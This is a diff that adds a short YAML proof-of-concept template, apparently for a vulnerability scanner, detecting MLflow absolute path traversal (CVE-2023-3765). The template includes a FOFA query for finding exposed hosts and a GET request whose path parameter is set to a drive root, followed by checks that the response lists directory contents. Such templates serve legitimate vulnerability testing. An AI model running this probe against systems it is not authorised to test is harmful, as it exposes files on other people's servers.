@@ -1,0 +1,25 @@
+id: poc-yaml-mlflow-absolute-path-traversal
+info:
+  name: Mlflow 绝对路径遍历漏洞(CVE-2023-3765)
+  severity: critical
+  tags:
+  - CVE-2023-3765
+  - 路径遍历
+  finger: mlflow
+  fofa: title="mlflow"
+requests:
+- method: GET
+  path: '/ajax-api/2.0/mlflow-artifacts/artifacts?path=C:'
+  expression: 'status_code == 200
+
+    && contains(body,"files")
+
+    && contains(body,"path")
+
+    && contains(body,"is_dir")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
